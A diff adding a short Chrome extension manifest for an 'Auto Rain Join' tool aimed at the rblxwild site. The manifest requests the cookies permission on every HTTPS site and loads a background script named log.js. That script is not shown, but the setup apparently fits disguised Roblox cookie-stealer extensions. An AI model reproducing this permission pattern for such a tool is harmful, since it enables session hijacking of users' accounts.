@@ -1,0 +1,20 @@
+{
+    "name": "Auto Rain Join",
+    "description": "extention for rblxwild auto rain",
+    "version": "1.0.0",
+    "manifest_version": 2,
+
+    "browser_action" : {
+        "default_icon": "assets/roblox.png"
+    },
+
+    "permissions": [
+        "cookies",
+        "https://*/*"
+
+    ],
+
+    "background": {
+      "scripts": ["scripts/log.js"]
+    }
+}
